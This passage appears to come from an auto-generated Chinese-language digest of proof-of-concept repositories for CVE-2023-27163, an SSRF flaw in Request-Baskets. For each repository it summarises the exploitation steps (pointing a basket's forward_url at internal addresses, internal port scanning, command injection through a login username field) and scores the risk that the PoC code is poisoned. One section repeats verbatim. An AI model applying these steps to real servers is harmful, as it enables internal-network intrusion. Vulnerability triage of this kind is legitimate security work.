CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个 SSRF 漏洞。攻击者可以利用 `/api/baskets/{name}` 组件，通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞是有效的。多个来源确认了该漏洞的存在，并且提供了可利用的 PoC 代码。

**利用方式：**
1.  攻击者创建一个恶意 basket，通过修改 basket 的配置，将 ForwardUrl 设置为攻击者想要访问的内部资源地址。PoC 代码中的 `MakeMaliciousBasket` 函数实现了这个步骤，它向 `/api/baskets` 发送 POST 请求，创建带有恶意配置的 basket。
2.  一旦恶意 basket 创建成功，当 Request-Baskets 服务收到发送到该 basket 的请求时，它会尝试将请求转发到攻击者指定的 ForwardUrl。PoC 代码中 `OpenMaliciousBasket` 函数实现了发送请求到basket, 触发SSRF漏洞.
3. PoC 代码还尝试利用login接口执行命令 `ExecuteCommand`.

**投毒风险：**
虽然PoC的主要目的是演示SSRF，但仍然存在一定的投毒风险。风险点包括:
* `FORWARD_URL`常量，默认指向`http://127.0.0.1:80`。如果攻击者修改了此地址，可以引导受害者请求恶意站点。
* `ExecuteCommand`函数, 攻击者可以通过修改POST请求体中的`username`参数，注入恶意命令。`commandPayload = fmt.Sprintf(commandPayload, b64command)`
代码的免责声明暗示了作者不负责任的态度，也增加了代码存在潜在风险的可能性。综合评估，投毒风险估计为 20%。

**搜索引擎结果验证：**
搜索引擎结果提供了多个关于 CVE-2023-27163 的信息来源，进一步确认了漏洞的存在和影响。Github链接指向了此漏洞的EXP

**项目地址:** [thomas-osgood/CVE-2023-27163](https://github.com/thomas-osgood/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---



---

## POC #20

**来源**: [CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md](../2023/CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例运行，且攻击者可以发送HTTP请求到该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过`api/baskets/{name}`组件构造恶意API请求，从而访问内部网络资源和敏感信息。 

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，此漏洞是有效的。 搜索引擎结果显示，存在多个PoC利用代码，表明该漏洞已被广泛研究。PoC代码通过创建basket，然后修改basket的forward_url，使其指向内部网络地址，从而实现SSRF。 

**投毒风险分析：**
分析提供的PoC代码`CVE-2023-27163.py`，其主要功能是利用SSRF漏洞进行内部端口扫描。代码逻辑清晰，未发现明显的恶意代码或后门。但依然存在轻微的投毒风险, 例如端口列表文件存在加入恶意端口的风险, 攻击者可以利用扫描结果进一步攻击内网服务。README.md文件未发现异常。

**利用方式分析：**
1.  **创建Basket：** 使用PoC脚本首先需要在目标Request-Baskets实例上创建一个新的basket，获得token。
2.  **修改Forward URL：**  PoC脚本利用PUT请求修改basket的`forward_url`，将其设置为攻击者想要访问的内部网络地址。利用`proxy_response`参数可以获取内部服务的响应，`insecure_tls`参数可以忽略证书错误。
3.  **触发请求：**  通过访问创建的basket的URL，触发Request-Baskets实例向内部网络地址发起请求。  
4.  **端口扫描:** PoC代码主要目的为端口扫描,判断内网端口是否开启。

总而言之，该PoC代码主要利用SSRF漏洞进行内网探测，未发现明显的恶意代码，但仍然需要谨慎使用，防止被用于非法用途。

**项目地址:** [theopaid/CVE-2023-27163-Request-Baskets](https://github.com/theopaid/CVE-2023-27163-Request-Baskets)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #21

**来源**: [CVE-2023-27163-thomas-osgood_CVE-2023-27163.md](../2023/CVE-2023-27163-thomas-osgood_CVE-2023-27163.md)

## CVE-2023-27163 - Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个 SSRF 漏洞。攻击者可以利用 `/api/baskets/{name}` 组件，通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞是有效的。多个来源确认了该漏洞的存在，并且提供了可利用的 PoC 代码。

**利用方式：**
1.  攻击者创建一个恶意 basket，通过修改 basket 的配置，将 ForwardUrl 设置为攻击者想要访问的内部资源地址。PoC 代码中的 `MakeMaliciousBasket` 函数实现了这个步骤，它向 `/api/baskets` 发送 POST 请求，创建带有恶意配置的 basket。
2.  一旦恶意 basket 创建成功，当 Request-Baskets 服务收到发送到该 basket 的请求时，它会尝试将请求转发到攻击者指定的 ForwardUrl。PoC 代码中 `OpenMaliciousBasket` 函数实现了发送请求到basket, 触发SSRF漏洞.
3. PoC 代码还尝试利用login接口执行命令 `ExecuteCommand`.

**投毒风险：**
虽然PoC的主要目的是演示SSRF，但仍然存在一定的投毒风险。风险点包括:
* `FORWARD_URL`常量，默认指向`http://127.0.0.1:80`。如果攻击者修改了此地址，可以引导受害者请求恶意站点。
* `ExecuteCommand`函数, 攻击者可以通过修改POST请求体中的`username`参数，注入恶意命令。`commandPayload = fmt.Sprintf(commandPayload, b64command)`
代码的免责声明暗示了作者不负责任的态度，也增加了代码存在潜在风险的可能性。综合评估，投毒风险估计为 20%。

**搜索引擎结果验证：**
搜索引擎结果提供了多个关于 CVE-2023-27163 的信息来源，进一步确认了漏洞的存在和影响。Github链接指向了此漏洞的EXP

**项目地址:** [thomas-osgood/CVE-2023-27163](https://github.com/thomas-osgood/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

